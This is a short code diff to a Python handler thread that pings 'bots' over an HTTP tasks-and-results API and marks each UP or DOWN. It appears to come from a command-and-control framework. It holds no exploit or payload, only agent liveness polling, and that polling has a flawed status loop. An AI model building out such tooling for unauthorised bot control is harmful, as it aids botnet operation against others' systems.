@@ -155,9 +155,22 @@ class Handler(threading.Thread):
                         self.status[0] = "DOWN"
                 # HTTP
                 elif(self.transport_type == "HTTP"):
-                    request_payload_string = f'[{{"task_type":"ping","{key}":"{value}"}}]'
+                    request_payload_string = f'[{{"task_type":"ping","agent_id":{self.bot_id}}}]'
                     request_payload = json.loads(request_payload_string)
-                    pprint.pprint(api_post_request(api_endpoint, request_payload))
+                    task_obj = api_post_request("/tasks", request_payload)
+                    task_id = task_obj["task_id"]
+                    wfc = True # waiting for connection
+                    t_end = time.time() + 10
+                    while(time.time() < t_end and wfc):
+                        results = api_get_request("/results")
+                        for i in range(len(results)):
+                            if(results[i]["agent_id"] == self.bot_id and results[i]["task_id"] == task_id and results[i]["success"] == "true"):
+                                wfc = False
+                                self.status[0] = "UP"
+                            else:
+                                self.status[0] = "DOWN"
+
+
 
             except:
                 # Error code
